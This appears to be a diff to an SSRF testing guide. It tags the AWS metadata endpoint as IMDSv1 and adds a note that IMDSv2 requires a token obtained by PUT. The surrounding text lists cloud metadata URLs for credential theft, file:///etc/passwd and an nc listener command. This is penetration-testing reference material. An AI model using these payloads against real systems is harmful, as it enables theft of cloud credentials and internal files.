@@ -21,7 +21,7 @@ Use a listener like `interactsh`, Burp Collaborator, or a simple `nc -lvnp 80` /
 
 ```text
 # Cloud metadata endpoints (credential theft)
-http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS
+http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS (IMDSv1)
 http://169.254.169.254/metadata/v1/                                  # DigitalOcean
 http://metadata.google.internal/computeMetadata/v1/                  # GCP (needs Metadata-Flavor: Google header)
 http://169.254.169.254/metadata/instance?api-version=2021-02-01     # Azure (needs Metadata: true header)
@@ -34,6 +34,8 @@ http://internal-service.local/
 # Local file access (if scheme not restricted)
 file:///etc/passwd
 ```
+
+> **Note:** AWS instances launched since 2024 default to IMDSv2, which requires a session token obtained via a `PUT` request (`X-aws-ec2-metadata-token-ttl-seconds` header) before the metadata endpoint can be read with `GET`. A plain GET-based SSRF will fail against IMDSv2-only instances unless the vulnerable request can also be made to send a `PUT` with custom headers.
 
 **Filter bypass techniques (when a blocklist filters `localhost`/`127.0.0.1`/private ranges):**
 
